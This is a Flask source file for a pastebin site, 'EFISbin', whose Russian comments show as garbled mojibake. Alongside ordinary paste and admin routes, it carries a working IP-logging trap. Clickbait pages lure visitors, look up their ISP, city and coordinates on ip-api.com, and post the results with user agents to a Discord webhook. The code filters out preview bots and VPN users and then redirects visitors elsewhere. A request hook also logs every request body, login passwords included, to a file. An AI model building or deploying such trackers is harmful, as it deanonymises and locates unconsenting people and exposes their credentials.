import logging
from logging.handlers import RotatingFileHandler
import os
import time
from datetime import datetime, timedelta
from functools import wraps

import httpagentparser
import requests
from dotenv import load_dotenv
from flask import Flask, render_template, redirect, url_for, request, flash, abort, jsonify
from flask import send_from_directory
from flask_caching import Cache
from flask_compress import Compress
from flask_login import LoginManager, login_user, login_required, logout_user, current_user, UserMixin
from flask_sqlalchemy import SQLAlchemy
from flask_wtf import FlaskForm, RecaptchaField
from sqlalchemy.exc import OperationalError
from werkzeug.security import generate_password_hash, check_password_hash
from wtforms import StringField, PasswordField, SubmitField, TextAreaField, BooleanField, SelectField, SelectMultipleField
from wtforms.validators import DataRequired, Length, Email, EqualTo, ValidationError, Optional
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from pygments import highlight
from pygments.lexers import get_lexer_by_name
from pygments.formatters import HtmlFormatter
import markdown
from markdown.extensions.toc import TocExtension
from markdown.extensions.codehilite import CodeHiliteExtension
import bleach
import re


# –ó–∞–≥—Ä—É–∑–∫–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è –∏–∑ —Ñ–∞–π–ª–∞ .env
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'default_secret_key')
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'default_database_url')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['RECAPTCHA_PUBLIC_KEY'] = os.getenv('RECAPTCHA_PUBLIC_KEY')
app.config['RECAPTCHA_PRIVATE_KEY'] = os.getenv('RECAPTCHA_PRIVATE_KEY')
compress = Compress()
compress.init_app(app)
app.config['COMPRESS_MIMETYPES'] = [
    'text/html',
    'text/css',
    'text/xml',
    'application/json',
    'application/javascript'
]
app.config['COMPRESS_LEVEL'] = 6
app.config['COMPRESS_MIN_SIZE'] = 500

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'
cache = Cache(app, config={'CACHE_TYPE': 'SimpleCache'})
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379/0")

# ------------------ –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –¥–ª—è EFISbin ------------------
CLICKBAIT_TITLE = "üò± –®–û–ö! –í—ã –Ω–µ –ø–æ–≤–µ—Ä–∏—Ç–µ, —á—Ç–æ –∑–¥–µ—Å—å —Å–∫—Ä—ã—Ç–æ..."
CLICKBAIT_DESCRIPTION = "üî• –≠–∫—Å–∫–ª—é–∑–∏–≤! –≠—Ç–æ –¥–æ–ª–∂–Ω–æ –±—ã–ª–æ –æ—Å—Ç–∞—Ç—å—Å—è –≤ —Å–µ–∫—Ä–µ—Ç–µ, –Ω–æ —É—Ç–µ–∫–ª–æ –≤ —Å–µ—Ç—å. –ü–æ—Å–º–æ—Ç—Ä–∏—Ç–µ, –ø–æ–∫–∞ –Ω–µ —É–¥–∞–ª–∏–ª–∏!"
CLICKBAIT_IMAGE = "https://example.com/image.png"
REAL_URL = "https://example.com/real"
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', 'default_webhook_url')
click_count = 0
# -------------------------------------------------------------

# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
VPN_CHECK = int(os.getenv("VPN_CHECK", "1"))  # –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é 1, –µ—Å–ª–∏ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ
ANTI_BOT = int(os.getenv("ANTI_BOT", "1"))    # –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é 1, –µ—Å–ª–∏ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ
handler = RotatingFileHandler('app.log', maxBytes=10000, backupCount=3)
handler.setLevel(logging.INFO)
app.logger.addHandler(handler)

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π
config = {
    "webhook": DISCORD_WEBHOOK_URL,
    "image": CLICKBAIT_IMAGE,
    "imageArgument": True,
    "username": "EFISbin",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Hello, world!",
        "richMessage": True,
    },
    "vpnCheck": VPN_CHECK,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": ANTI_BOT,
    "redirect": {
        "redirect": True,
        "page": REAL_URL
    },
}

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "EFISbin - –û—à–∏–±–∫–∞",
                "color": config["color"],
                "description": f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –∑–∞–ª–æ–≥–∏—Ä–æ–≤–∞—Ç—å IP!\n\n**–û—à–∏–±–∫–∞:**\n\n{error}\n",
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "EFISbin - –°—Å—ã–ª–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞",
                    "color": config["color"],
                    "description": f"–°—Å—ã–ª–∫–∞ EFISbin –±—ã–ª–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ —á–∞—Ç!\n–í—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å IP.\n\n**–ö–æ–Ω–µ—á–Ω–∞—è —Ç–æ—á–∫–∞:** `{endpoint}`\n**IP:** `{ip}`\n**–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857")
        response.raise_for_status()  # –í—ã–∑–æ–≤ –∏—Å–∫–ª—é—á–µ–Ω–∏—è –¥–ª—è HTTP –æ—à–∏–±–æ–∫
        info = response.json()

        if 'proxy' in info and info["proxy"]:
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""

        if 'hosting' in info and info["hosting"]:
            if config["antiBot"] == 4:
                if info.get("proxy"):
                    pass
                else:
                    return
            if config["antiBot"] == 3:
                return
            if config["antiBot"] == 2:
                if info.get("proxy"):
                    pass
                else:
                    ping = ""
            if config["antiBot"] == 1:
                ping = ""

        os, browser = httpagentparser.simple_detect(useragent)

        timezone_parts = info.get('timezone', 'Unknown/Unknown').split('/')
        timezone_name = timezone_parts[1].replace('_', ' ') if len(timezone_parts) > 1 else 'Unknown'
        timezone_region = timezone_parts[0] if len(timezone_parts) > 1 else 'Unknown'

        embed = {
            "username": config["username"],
            "content": ping,
            "embeds": [
                {
                    "title": "EFISbin - IP –∑–∞–ª–æ–≥–∏—Ä–æ–≤–∞–Ω",
                    "color": config["color"],
                    "description": f"""**–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫—Ä—ã–ª –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ!**

**–ö–æ–Ω–µ—á–Ω–∞—è —Ç–æ—á–∫–∞:** `{endpoint}`

**–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± IP:**
> **IP:** `{ip if ip else 'Unknown'}`
> **–ü—Ä–æ–≤–∞–π–¥–µ—Ä:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **–°—Ç—Ä–∞–Ω–∞:** `{info.get('country', 'Unknown')}`
> **–†–µ–≥–∏–æ–Ω:** `{info.get('regionName', 'Unknown')}`
> **–ì–æ—Ä–æ–¥:** `{info.get('city', 'Unknown')}`
> **–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'–ü—Ä–∏–±–ª–∏–∑–∏—Ç–µ–ª—å–Ω—ã–µ' if not coords else '–¢–æ—á–Ω—ã–µ, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å:** `{timezone_name}` ({timezone_region})
> **–ú–æ–±–∏–ª—å–Ω—ã–π:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **–ë–æ—Ç:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else '–í–æ–∑–º–æ–∂–Ω–æ' if info.get('hosting') else 'False'}`

**–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö:**
> **–û–°:** `{os}`
> **–ë—Ä–∞—É–∑–µ—Ä:** `{browser}`

**User Agent:**
```
{useragent}
```""",
                }
            ],
        }

        if url:
            embed["embeds"][0].update({"thumbnail": {"url": url}})
        requests.post(config["webhook"], json=embed)
        return info

    except requests.exceptions.RequestException as e:
        logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± IP: {e}")
        return
    except ValueError as e:
        logging.error(f"–û—à–∏–±–∫–∞ —Ä–∞–∑–±–æ—Ä–∞ JSON: {e}")
        return

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è IP
def ip_logger(event="–ù–æ–≤—ã–π –≤–∏–∑–∏—Ç", custom_data=None):
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    referrer = request.headers.get('Referer')
    content = f"üö® {event}!\n**IP:** {user_ip}\n**User-Agent:** {user_agent}\n**Referrer:** {referrer}"

    if custom_data:
        content += f"\n**–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:** {custom_data}"

    payload = {"content": content}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤–µ–±—Ö—É–∫–∞ Discord:", e)

def send_notification(user, message):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é —á–µ—Ä–µ–∑ Discord"""
    try:
        payload = {
            "content": f"üîî –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –¥–ª—è {user.username}:\n{message}"
        }
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        app.logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è: {str(e)}")

# –ú–æ–¥–µ–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True, nullable=False)
    email = db.Column(db.String(150), unique=True, nullable=True)  # –°–¥–µ–ª–∞—Ç—å email –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–º
    password_hash = db.Column(db.String(200), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)  # –§–ª–∞–≥ –∞–¥–º–∏–Ω–∞
    is_banned = db.Column(db.Boolean, default=False)  # –§–ª–∞–≥ –±–∞–Ω–∞
    hardware_id = db.Column(db.String(256), unique=True, nullable=True)  # –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –æ–±–æ—Ä—É–¥–æ–≤–∞–Ω–∏—è
    pastes = db.relationship('Paste', backref='author', lazy=True)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_admin:
            flash("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ.", "danger")
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

# –ú–æ–¥–µ–ª—å Paste
class Paste(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(150))
    content = db.Column(db.Text, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
    is_anonymous = db.Column(db.Boolean, default=False)  # –ê–Ω–æ–Ω–∏–º–Ω–∞—è –ø—É–±–ª–∏–∫–∞—Ü–∏—è
    language = db.Column(db.String(50), default='text')  # –Ø–∑—ã–∫ –¥–ª—è –ø–æ–¥—Å–≤–µ—Ç–∫–∏ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å–∞

class AdminLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    admin_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    action = db.Column(db.String(256), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    details = db.Column(db.Text, nullable=True)

# –ú–æ–¥–µ–ª—å Clickbait
class Clickbait(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100), unique=True, nullable=False)  # –ù–æ–≤–æ–µ –ø–æ–ª–µ
    title = db.Column(db.String(256), nullable=False)
    description = db.Column(db.String(512), nullable=False)
    image_url = db.Column(db.String(512), nullable=False)
    real_url = db.Column(db.String(512), nullable=False)

# –ú–æ–¥–µ–ª—å —Ç–µ–≥–æ–≤
class Tag(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(50), unique=True)

paste_tags = db.Table('paste_tags',
    db.Column('paste_id', db.Integer, db.ForeignKey('paste.id')),
    db.Column('tag_id', db.Integer, db.ForeignKey('tag.id'))
)

# –ú–æ–¥–µ–ª—å –æ—Ü–µ–Ω–æ–∫
class Vote(db.Model):
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), primary_key=True)
    paste_id = db.Column(db.Integer, db.ForeignKey('paste.id'), primary_key=True)
    value = db.Column(db.Integer)  # 1 –∏–ª–∏ -1

# –ú–æ–¥–µ–ª—å –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–µ–≤
class Comment(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    text = db.Column(db.Text)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    paste_id = db.Column(db.Integer, db.ForeignKey('paste.id'))

@login_manager.user_loader
def load_user(user_id):
    with app.app_context():
        return db.session.get(User, int(user_id))

# –§–æ—Ä–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
class RegistrationForm(FlaskForm):
    username = StringField('–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è', validators=[DataRequired(), Length(3, 150)])
    email = StringField('Email', validators=[Optional(), Email(), Length(max=150)])  # –°–¥–µ–ª–∞—Ç—å email –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–º
    password = PasswordField('–ü–∞—Ä–æ–ª—å', validators=[DataRequired(), Length(6, 100)])
    confirm_password = PasswordField('–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å', validators=[DataRequired(), EqualTo('password')])
    recaptcha = RecaptchaField()
    submit = SubmitField('–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è')

    def validate_username(self, username):
        user = User.query.filter_by(username=username.data).first()
        if user:
            raise ValidationError('–≠—Ç–æ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —É–∂–µ –∑–∞–Ω—è—Ç–æ. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –¥—Ä—É–≥–æ–µ.')

    def validate_email(self, email):
        if email.data:  # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ email –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω
            user = User.query.filter_by(email=email.data).first()
            if user:
                raise ValidationError('–≠—Ç–æ—Ç email —É–∂–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω.')

# –§–æ—Ä–º–∞ –≤—Ö–æ–¥–∞
class LoginForm(FlaskForm):
    username = StringField('–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è', validators=[DataRequired(), Length(3, 150)])
    password = PasswordField('–ü–∞—Ä–æ–ª—å', validators=[DataRequired()])
    submit = SubmitField('–í–æ–π—Ç–∏')

# –§–æ—Ä–º–∞ Paste
class PasteForm(FlaskForm):
    title = StringField('–ó–∞–≥–æ–ª–æ–≤–æ–∫', validators=[Length(max=150)])
    content = TextAreaField('–°–æ–¥–µ—Ä–∂–∏–º–æ–µ', validators=[DataRequired()])
    is_anonymous = BooleanField('–ê–Ω–æ–Ω–∏–º–Ω–∞—è –ø—É–±–ª–∏–∫–∞—Ü–∏—è')
    language = SelectField(
        '–Ø–∑—ã–∫',
        choices=[
            ('python', 'Python'),
            ('javascript', 'JavaScript'),
            ('html', 'HTML'),
            ('text', '–¢–µ–∫—Å—Ç')
        ],
        default='text'
    )
    tags = SelectMultipleField('–¢–µ–≥–∏', choices=[])
    submit = SubmitField('–°–æ–∑–¥–∞—Ç—å Paste')

# –§–æ—Ä–º–∞ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è Paste
class EditPasteForm(FlaskForm):
    title = StringField('–ó–∞–≥–æ–ª–æ–≤–æ–∫', validators=[Length(max=150)])
    content = TextAreaField('–°–æ–¥–µ—Ä–∂–∏–º–æ–µ', validators=[DataRequired()])
    submit = SubmitField('–°–æ—Ö—Ä–∞–Ω–∏—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∏—è')

# –§–æ—Ä–º–∞ Clickbait
class ClickbaitForm(FlaskForm):
    slug = StringField('–ù–∞–∑–≤–∞–Ω–∏–µ/–ß–ü–£', validators=[DataRequired(), Length(max=100)])
    title = StringField('–ó–∞–≥–æ–ª–æ–≤–æ–∫', validators=[DataRequired(), Length(max=256)])
    description = StringField('–û–ø–∏—Å–∞–Ω–∏–µ', validators=[DataRequired(), Length(max=512)])
    image_url = StringField('URL –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è', validators=[DataRequired(), Length(max=512)])
    real_url = StringField('–†–µ–∞–ª—å–Ω—ã–π URL', validators=[DataRequired(), Length(max=512)])
    submit = SubmitField('–°–æ—Ö—Ä–∞–Ω–∏—Ç—å')

    def validate_slug(self, slug):
        clickbait = Clickbait.query.filter_by(slug=slug.data).first()
        if clickbait:
            raise ValidationError('–≠—Ç–æ—Ç –ß–ü–£ —É–∂–µ –∑–∞–Ω—è—Ç. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –¥—Ä—É–≥–æ–π.')

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    storage_uri=REDIS_URL,  # –£–∫–∞–∑—ã–≤–∞–µ–º Redis
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

# –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞: —Å–ø–∏—Å–æ–∫ –ø–æ—Å–ª–µ–¥–Ω–∏—Ö Paste
@app.route('/sitemap.xml')
def sitemap():
    return send_from_directory(os.path.join(app.root_path, 'static'), 'sitemap.xml')

@app.route('/robots.txt')
def robots():
    return send_from_directory(os.path.join(app.root_path, 'static'), 'static/robots.txt')

@app.before_request
def log_request_info():
    app.logger.info('–ó–∞–≥–æ–ª–æ–≤–∫–∏: %s', request.headers)
    app.logger.info('–¢–µ–ª–æ: %s', request.get_data())

@app.after_request
def add_header(response):
    if request.path.startswith('/static/'):
        response.cache_control.max_age = 31536000  # 1 –≥–æ–¥
        response.cache_control.public = True
        response.headers['Expires'] = (datetime.now() + timedelta(days=365)).strftime('%a, %d %b %Y %H:%M:%S GMT')
    return response

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('500.html'), 500

@app.route('/')
@cache.cached(timeout=60)
def index():
    language = request.args.get('language', '')
    query = Paste.query
    if language:
        query = query.filter_by(language=language)
    pastes = query.order_by(Paste.created_at.desc()).all()
    return render_template('index.html', pastes=pastes)

@app.route('/privacy')
def privacy():
    return render_template('privacy.html')

@app.route('/terms')
def terms():
    return render_template('terms.html')

@app.route('/apple-touch-icon.png')
@app.route('/favicon.ico')
def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static'),
                              'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/offline')
def offline():
    return render_template('offline.html')

# ---------------------- –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å ----------------------
@app.route('/admin')
@login_required
@admin_required
def admin_panel():
    return render_template('admin.html')

# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏: —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
@app.route('/admin/users')
@login_required
@admin_required
def admin_users():
    users = User.query.all()
    return render_template('admin_users.html', users=users)

# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ Paste: —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö Paste
@app.route('/admin/pastes')
@login_required
@admin_required
def admin_pastes():
    pastes = Paste.query.order_by(Paste.created_at.desc()).all()
    return render_template('admin_pastes.html', pastes=pastes)

# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ Clickbait
@app.route('/admin/clickbait', methods=['GET', 'POST'])
@login_required
@admin_required
def admin_clickbait():
    clickbaits = Clickbait.query.all()
    return render_template('admin_clickbait.html', clickbaits=clickbaits)

@app.route('/admin/clickbait/delete/<int:cb_id>', methods=['POST'])
@login_required
@admin_required
def delete_clickbait(cb_id):
    clickbait = Clickbait.query.get_or_404(cb_id)
    db.session.delete(clickbait)
    db.session.commit()
    flash('Clickbait —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω', 'success')
    return redirect(url_for('admin_clickbait'))

@app.route('/admin/clickbait/new', methods=['GET', 'POST'])
@login_required
@admin_required
def new_clickbait():
    form = ClickbaitForm()
    if form.validate_on_submit():
        clickbait = Clickbait(
            slug=form.slug.data,
            title=form.title.data,
            description=form.description.data,
            image_url=form.image_url.data,
            real_url=form.real_url.data
        )
        db.session.add(clickbait)
        db.session.commit()
        flash("–ù–æ–≤—ã–π clickbait —Å–æ–∑–¥–∞–Ω", "success")
        return redirect(url_for('admin_clickbait'))
    return render_template('new_clickbait.html', form=form)

# –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ Clickbait
@app.route('/admin/clickbait/edit/<int:cb_id>', methods=['GET', 'POST'])
@login_required
@admin_required
def edit_clickbait(cb_id):
    clickbait = Clickbait.query.get_or_404(cb_id)
    form = ClickbaitForm(obj=clickbait)
    if form.validate_on_submit():
        form.populate_obj(clickbait)
        db.session.commit()
        flash("Clickbait –æ–±–Ω–æ–≤–ª–µ–Ω", "success")
        return redirect(url_for('admin_clickbait'))
    return render_template('edit_clickbait.html', form=form, clickbait=clickbait)

@app.route('/clickbait/<slug>')
def clickbait_page(slug):
    global click_count
    click_count += 1

    clickbait = Clickbait.query.filter_by(slug=slug).first_or_404()

    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    makeReport(user_ip, user_agent, endpoint=request.path)

    return render_template('clickbait.html',
                           clickbait_title=clickbait.title,
                           clickbait_description=clickbait.description,
                           clickbait_image=clickbait.image_url,
                           real_url=clickbait.real_url)

@app.route('/clickbait-list')
def clickbait_list():
    clickbaits = Clickbait.query.all()
    return render_template('clickbait_list.html', clickbaits=clickbaits)

# –ê–¥–º–∏–Ω-—Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è clickbait (—Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∏ —Å–±—Ä–æ—Å —Å—á–µ—Ç—á–∏–∫–∞)
@app.route('/admin/clickbait/reset', methods=['POST'])
@login_required
@admin_required
def reset_clickbait():
    global click_count
    click_count = 0
    flash("–°—á–µ—Ç—á–∏–∫ –∫–ª–∏–∫–æ–≤ —Å–±—Ä–æ—à–µ–Ω.", "success")
    return redirect(url_for('admin_clickbait'))

# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–∞–Ω–∞–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
@app.route('/admin/ban/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def ban_user(user_id):
    user = db.session.get(User, user_id)
    if user:
        user.is_banned = True
        db.session.commit()
        flash(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user.username} –∑–∞–±–∞–Ω–µ–Ω.", "success")
    return redirect(url_for('admin_users'))

@app.route('/admin/unban/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def unban_user(user_id):
    user = db.session.get(User, user_id)
    if user:
        user.is_banned = False
        db.session.commit()
        flash(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user.username} —Ä–∞–∑–±–∞–Ω–µ–Ω.", "success")
    return redirect(url_for('admin_users'))

# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–∏–µ–º Paste
@app.route('/admin/paste/delete/<int:paste_id>', methods=['POST'])
@login_required
@admin_required
def delete_paste(paste_id):
    paste = db.session.get(Paste, paste_id)
    if paste:
        db.session.delete(paste)
        db.session.commit()
        flash("Paste —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω.", "success")
    return redirect(url_for('admin_pastes'))

# –ü—Ä–æ—Å–º–æ—Ç—Ä –∞–¥–º–∏–Ω-–ª–æ–≥–æ–≤
@app.route('/admin/logs')
@login_required
@admin_required
def admin_logs():
    logs = AdminLog.query.order_by(AdminLog.timestamp.desc()).all()
    return render_template('admin_logs.html', logs=logs)

@app.route('/admin/paste/edit/<int:paste_id>', methods=['GET', 'POST'])
@login_required
@admin_required
def edit_paste(paste_id):
    paste = db.session.get(Paste, paste_id)
    if not paste:
        abort(404)
    form = EditPasteForm(obj=paste)
    if form.validate_on_submit():
        paste.title = form.title.data
        paste.content = form.content.data
        db.session.commit()

        # –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–µ–π—Å—Ç–≤–∏—è
        log = AdminLog(admin_id=current_user.id, action=f"–û—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω paste ID: {paste_id}", details=f"–ó–∞–≥–æ–ª–æ–≤–æ–∫: {paste.title}, –°–æ–¥–µ—Ä–∂–∏–º–æ–µ: {paste.content}")
        db.session.add(log)
        db.session.commit()

        flash("Paste —É—Å–ø–µ—à–Ω–æ –æ—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω.", "success")
        return redirect(url_for('admin_pastes'))
    return render_template('edit_paste.html', form=form, paste=paste)

@app.route('/paste/request_edit/<int:paste_id>', methods=['GET', 'POST'])
@login_required
def request_edit_paste(paste_id):
    paste = db.session.get(Paste, paste_id)
    if not paste:
        abort(404)
    if not current_user.is_admin and paste.user_id != current_user.id:
        flash("–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —ç—Ç–æ–≥–æ paste.", "danger")
        return redirect(url_for('index'))
    form = EditPasteForm(obj=paste)
    if form.validate_on_submit():
        paste.title = form.title.data
        paste.content = form.content.data
        db.session.commit()

        # –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–µ–π—Å—Ç–≤–∏—è
        if current_user.is_admin:
            log = AdminLog(admin_id=current_user.id, action=f"–û—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω paste ID: {paste_id}", details=f"–ó–∞–≥–æ–ª–æ–≤–æ–∫: {paste.title}, –°–æ–¥–µ—Ä–∂–∏–º–æ–µ: {paste.content}")
            db.session.add(log)
            db.session.commit()

        flash("Paste —É—Å–ø–µ—à–Ω–æ –æ—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω.", "success")
        return redirect(url_for('view_paste', paste_id=paste.id))
    return render_template('edit_paste.html', form=form, paste=paste)

# ------------------- –§—É–Ω–∫—Ü–∏–∏ Clickbait --------------------
